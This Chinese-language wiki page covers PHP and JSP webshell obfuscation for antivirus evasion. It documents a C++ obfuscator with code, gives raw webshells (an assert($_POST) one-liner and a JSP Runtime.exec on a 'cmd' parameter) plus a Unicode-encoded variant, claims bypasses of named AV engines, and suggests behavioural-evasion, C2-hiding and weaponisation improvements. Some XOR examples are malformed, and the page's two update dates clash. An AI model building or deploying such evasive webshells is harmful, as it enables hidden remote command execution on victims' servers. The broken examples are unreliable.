---
title: 'PHP Webshell Obfuscation: Two-Stage Arithmetic & XOR Splitting for AV Evasion'
description: 'Deep dive into a C++ tool implementing two-stage PHP webshell obfuscation:
  Stage 1 splits characters into randomized arithmetic expressions (binary to quinary
  operations); Stage 2 XOR-splits characteristic functions (chr, assert) into character
  pairs. Uses time-based randomization for polymorphic output per build. Newly extended
  with GBByPass Unicode encoding bypass for Behinder/Godzilla webshells against Alibaba
  Cloud, 360, Huorong and other AV engines.'
category: program-analysis
tags:
- PHP
- Webshell
- Obfuscation
- AV Evasion
- C++
- Polymorphic Code
- Arithmetic Expression Splitting
- XOR Obfuscation
- Regex Bypass
- Red Teaming
- Non-Alphanumeric Webshell
- Bitwise NOT Construction
- Character Increment Construction
- GBByPass
- Unicode Encoding
- Behinder
- Godzilla
- Alibaba Cloud
- 360
- Huorong
date: 2025-01-15
updated: '2026-11-15'
---

## 概述

本页面记录 PHP 一句话木马混淆与免杀的两大核心技术流派：

1. **C++ 两阶段混淆工具**：通过算术表达式拆分与异或拆分实现多态混淆，绕过基于正则的静态查杀
2. **GBByPass 工具**：利用 Unicode 编码绕过关键字检测，专门针对冰蝎、哥斯拉等主流 Webshell 客户端，实测绕过阿里云、360、火绒等主流查杀引擎

两种技术分别从**代码结构变换**与**编码层面绕过**两个维度对抗静态特征匹配，形成互补的免杀体系。

---

## 技术流派一：C++ 两阶段混淆工具

### 核心架构：三大类设计

```
┌─────────────────────────────────────────────────────────────┐
│                      foperation                             │
│  文件读写操作类：逐行读取待混淆文件，写入混淆后的 PHP 文件    │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                      codeconfuse                            │
│  初级表达式混淆：字符 → 随机多元算术表达式 → chr(expr)      │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│                      orderconfuse                           │
│  二级异或拆分：chr/assert 等特征函数 → ('A'^'B') 形式       │
└─────────────────────────────────────────────────────────────┘
```

### foperation 类 —— 文件 I/O 与流程编排

**职责**：
- 读取源文件（仅需木马核心代码，**无需 `<?php ?>` 标签**）
- 调用 `codeconfuse` 完成第一阶段混淆
- 调用 `orderconfuse` 完成第二阶段混淆
- 写入最终混淆文件（自动添加 `<?php` 头和 `?>` 尾）

**核心流程**：
```cpp
fop.setLineResultText("<?php");
fop.writeLineText();

while (fop.readLineText()) {
    string result;
    while (char ch = fop.getLineChar()) {
        codeC.setData(ch, rand()%3+2);  // 运算元数 2~4
        string str = codeC.getResult();
        str = "chr" + str + '.';
        result += str;
    }
    result[result.length()-1] = ' ';
    result = orderC.confuse(result);
    fop.setLineResultText(result);
    fop.writeLineText();
}
fop.setLineResultText("?>");
```

### 第一阶段：codeconfuse —— 算术表达式多态拆分

**设计目标**：将单字符转形为 `chr(随机算术表达式)`，结构随机、运算元可配置、同字符每次生成不同表达式。

**核心算法流程**：
```
输入字符 c → createBigInteger() → charSplit() → dataVerification() → 完整表达式
```

**关键技术点**：

| 技术点 | 实现细节 |
|--------|----------|
| 随机化种子 | `srand((unsigned)time(NULL))` + `rand() % 10000` |
| 大数生成 | `bigInteger = rand() * randomRoot` |
| 括号随机化 | `addBrackets()` 以 50% 概率添加括号 |
| 运算类型 | `addSplit`、`subSplit`、`mulSplit`、`divSplit`、`xorSplit` |
| 校验值融合 | `proofValue` 与 `separationFactor` 插入表达式中段 |
| 运算元数量 | `rand()%3+2` → 2~4 元 |

**混淆效果对比**：

原始代码：
```php
assert($_POST['x']);
```

第一阶段输出（节选）：
```php
chr(-1605+1702).chr(1186 - 1071).chr((((2131) - 412) - 1714) * 23)
.chr((((597) * 3) - -115268) / 1159).chr((((713834) / 457) - -15) ^ 1627)
...
```

### 第二阶段：orderconfuse —— 特征函数异或拆分

**设计目标**：消除 `chr`、`assert` 等高频特征函数名。

**异或拆分原理**：利用 `A ^ B = C` 将目标字符拆解为两个可打印字符。

```php
'chr'  →  (' '^'c').(''^'k').(''^'t')
'assert'  →  (' '^'a').(''^'s').(''^'s').(''^'e').(''^'r').(''^'t')
```

**字符对搜索算法**：
```cpp
string confuseChr() {
    for (int i = randomStart; i < 127; i++) {
        for (int j = 32; j < 127; j++) {
            if ((i ^ j) == targetChar && isPrintable(i) && isPrintable(j)) {
                return "('" + char(i) + "'^'" + char(j) + "')";
            }
        }
    }
}
```

**过滤规则**：排除空白字符、`'`, `"`, `\`, `?`, `>` 等 PHP 语法敏感字符。

### 完整混淆示例

最终输出可直接作为 PHP 脚本执行，`$_POST['x']` 参数内容会被 `assert()` 评估执行。

---

## 技术流派二：GBByPass —— Unicode 编码绕过主流查杀引擎

### 工具概况

- **项目地址**：https://github.com/czz1233/GBByPass
- **核心原理**：利用 Unicode 编码绕过关键字检测
- **目标客户端**：冰蝎、哥斯拉等主流 Webshell 管理工具
- **获取方式**：公众号后台回复「220328」

### 实战绕过效果

| 查杀引擎 | 绕过状态 | 备注 |
|----------|----------|------|
| **阿里云** | ✅ 绕过 | 命令执行测试 `http://xxx:8080/test.jsp?cmd=whoami` 通过 |
| **360** | ✅ 绕过 | 静态查杀通过 |
| **火绒** | ✅ 绕过 | 静态查杀通过 |
| **VirusTotal** | ✅ 低检出率 | 多引擎检测通过 |
| **webdir+** | ✅ 绕过 | 目录扫描工具规避 |

### Unicode 编码绕过原理

利用 Java/JSP、PHP 等运行时对 Unicode 转义序列的自动解析特性，将敏感关键字（如 `Runtime`、`exec`、`assert`、`eval` 等）编码为 `\uXXXX` 形式，源码层面不包含明文关键字，但运行时仍能正确执行。

**示例对比**：

原始 JSP 恶意代码：
```jsp
<%
    Runtime.getRuntime().exec(request.getParameter("cmd"));
%>
```

Unicode 编码后：
```jsp
<%
    \u0052\u0075\u006e\u0074\u0069\u006d\u0065.\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065().\u0065\u0078\u0065\u0063(request.getParameter("cmd"));
%>
```

**适用场景**：
- Java/JSP 环境：`\uXXXX` 在编译期自动解码
- PHP 环境：配合 `json_decode` 或运行时解码函数
- 冰蝎/哥斯拉流量：客户端发送 Payload 前自动 Unicode 编码，服务端内存马自动解码执行

---

## 优势与局限性对比分析

| 维度 | C++ 两阶段混淆 | GBByPass Unicode 编码 |
|------|----------------|----------------------|
| **对抗层面** | 代码结构、字面量、函数名 | 关键字匹配、正则特征 |
| **多态性** | 极强（时间种子，每次构建不同） | 中等（编码确定性，可结合随机大小写） |
| **适用语言** | PHP 专用 | Java/JSP、PHP、ASP.NET 通用 |
| **目标客户端** | 通用 PHP 一句话 | 冰蝎、哥斯拉专用 |
| **绕过效果** | 绕过静态正则查杀 | 绕过主流 AV 静态查杀（实测阿里云/360/火绒） |
| **行为检测** | 无绕过能力 | 无绕过能力 |
| **工程化程度** | 源码开源，可二次开发 | 工具化发布，闭源/半开源 |

---

## 检测对抗视角

### 静态特征提取难点

| 特征类型 | 传统查杀方式 | C++工具对抗 | GBByPass对抗 |
|----------|--------------|-------------|--------------|
| 函数名 `assert`/`chr` | 正则 `\b(assert|chr)\b` | ✅ 异或拆解 | ✅ Unicode 编码 |
| 变量赋值模式 | `\$\w+\s*=` | ⚠️ 单字母变量模式仍在 | ✅ 编码后无此模式 |
| `chr(数字)` | `chr\(\s*\d+\s*\)` | ✅ 展开为复杂表达式 | N/A |
| Base64/gzip 存根 | `base64_decode\|gzinflate` | ✅ 无编码存根 | ✅ 无编码存根 |
| 敏感关键字 | `Runtime/exec/eval/assert` | ✅ 字符级拆分 | ✅ Unicode 转义 |

### 行为检测绕过建议（超出工具范围）

- 结合 **PHP 协议封装器** 隐藏执行流
- 使用 **动态函数调用** + 变量函数名
- 对接 **C2 框架** 实现流量混淆：[[cobalt-strike-external-c2-smb-beacon]]、[[covenant-c2-framework-analysis]]
- 部署 **重定向器** 隐匿 C2 基础设施：[[c2-redirectors-malleable-c2-profiles]]

---

## 非字母数字构造技术（补充）

> 来源：0w1Club 归档文章《无数字字母构造webshell学习》
> 详细技术细节可参考 [[php-non-alphanumeric-webshell-construction]] 页面。

### 三大核心方法

| 方法 | 核心原理 | 适用场景 |
|------|----------|----------|
| **异或构造** | `A ^ B = target`，两个非字母数字字符异或得目标字符 | 通用性最强，Payload 相对简短 |
| **取反构造** | `~('汉字'[index])` 利用 UTF-8 高位字节取反，配合弱类型构造数字下标 | 特定编码环境、WAF 过滤异或时 |
| **字符自增构造** | 从 `'A'` 起步通过 `++` 得到任意大写字母 | 极端过滤环境、理解 PHP 类型转换边界 |

---

## 关联技术生态

### 红队基础设施与免杀链

| 环节 | 相关知识页 |
|------|------------|
| C2 通信隐匿 | [[c2-redirectors-malleable-c2-profiles]]、[[smb-named-pipe-c2-communication]] |
| Beacon 变体与 External C2 | [[cobalt-strike-external-c2-smb-beacon]] |
| .NET 免杀与 CLR 日志篡改 | [[dotnet-clr-usage-log-tampering-edr-evasion]] |
| 内存注入与模块隐藏 | [[phantom-dll-hollowing-technique]]、[[pe-manual-mapping-loader-implementation]] |
| 硬件级初始访问 | [[badusb-hid-attack-arduino-leonardo]] |

### Web 攻击面与靶场实战

| 场景 | 相关知识页 |
|------|------------|
| 文件上传绕过 Getshell | [[vulnhub-bbs-cute-102-writeup]]、[[edu-src-penetration-test-case-study]] |
| PHP 反序列化/代码执行链 | [[vulnhub-chronos-writeup]] |
| 靶场综合实战索引 | [[vulnhub-platform-resource-index]] |

### 二进制分析与逆向工程基础

| 基础技能 | 相关知识页 |
|----------|------------|
| PE 结构与手动映射 | [[pe-manual-mapping-loader-implementation]]、[[pe-export-table-internals]]、[[pe-import-table-internals]] |
| Windows 系统调用内幕 | [[windows-syscall-internals-sysenter-kifastcallentry]] |
| 栈溢出与 Shellcode 编写 | [[windows-x86-stack-overflow-shellcode-execution]]、[[rop-linux-x86-beginner-tutorial]] |
| IDA Pro 实战技巧 | [[ida-pro-tips-plugins-python]] |

---

## 代码复现与改进方向

### C++ 工具编译环境

- **语言**：C++11/14
- **平台**：Windows (依赖 `<windows.h>`、MSVC 兼容)
- **标准库**：`<iostream>`、`<fstream>`、`<string>`、`<cstdlib>`、`<ctime>`

### 改进建议（按优先级）

1. **修复文件操作缺陷**：自动剥离 `<?php ?>`、忽略注释块
2. **第三阶段：整体编码/加密**：Base64/RC4/自定义编码，权衡解密存根特征
3. **表达式结构多样化**：引入三元运算符、位运算、死代码插入
4. **变量名与结构随机化**：变量名长度/字符集随机、语句顺序打乱
5. **跨平台支持**：移除 `<windows.h>` 依赖、命令行参数化
6. **对抗行为分析**：环境检测、延迟执行、分阶段加载
7. **集成非字母数字构造模块**：新增 `--non-alnum` 模式，支持三种构造方法切换

### GBByPass 扩展方向

- 支持更多 Webshell 客户端（蚁剑、C刀等）
- 增加随机大小写 + Unicode 混合编码模式
- 集成流量加密模块对抗 WAF 语义分析
- 开发 Burp Suite 插件实现实时编码转换

---

## 总结

本页面整合了 PHP Webshell 免杀的两大主流技术路线：

1. **C++ 两阶段混淆**：**结构层面多态**——数据即代码、控制流即数据，通过算术表达式与异或运算消除静态特征，适合通用 PHP 一句话木马的工程化混淆
2. **GBByPass Unicode 编码**：**编码层面绕过**——利用运行时自动解码特性，针对冰蝎/哥斯拉等主流客户端实现「开箱即用」的 AV 绕过，实测通过阿里云、360、火绒查杀

两者**互补而非替代**：前者适合二次开发集成到红队武器库，后者适合实战快速部署。但本质均为**静态对抗**，对动态行为分析、RASP、语义引擎无效。

实战免杀需构建**全链路对抗体系**：加载器免杀 + 内存执行 + 流量混淆 + 基础设施隐匿 + 行为规避，参考上文「关联技术生态」各知识页深化构建。

---

## 交叉引用索引

- **C2 基础设施与流量混淆**：[[c2-redirectors-malleable-c2-profiles]]、[[cobalt-strike-external-c2-smb-beacon]]、[[covenant-c2-framework-analysis]]、[[smb-named-pipe-c2-communication]]
- **内存执行与模块隐藏**：[[phantom-dll-hollowing-technique]]、[[pe-manual-mapping-loader-implementation]]
- **EDR 规避技术**：[[dotnet-clr-usage-log-tampering-edr-evasion]]、[[named-pipe-smb-detection-sysmon]]
- **Web 攻击链实战**：[[vulnhub-bbs-cute-102-writeup]]、[[edu-src-penetration-test-case-study]]、[[vulnhub-platform-resource-index]]
- **二进制分析基础**：[[pe-export-table-internals]]、[[pe-import-table-internals]]、[[windows-syscall-internals-sysenter-kifastcallentry]]、[[ida-pro-tips-plugins-python]]
- **硬件初始访问**：[[badusb-hid-attack-arduino-leonardo]]
- **逆向工程入门**：[[reverse-engineering-beginner-learning-path]]、[[crackme-analysis-keygen-development-case-study]]
- **非字母数字构造专题**：[[php-non-alphanumeric-webshell-construction]]

---

*页面维护者：数字知识库策展人*  
*最后更新：2026-01-20*  
*来源归档：0w1Club 微信公众号文章《对PHP一句话混淆来绕过正则匹配查杀》及《无数字字母构造webshell学习》；GBByPass 项目实测记录*

## 来源

- [102网络攻防实验室-202102-202203_1](../sources/102网络攻防实验室-202102-202203_1.md)
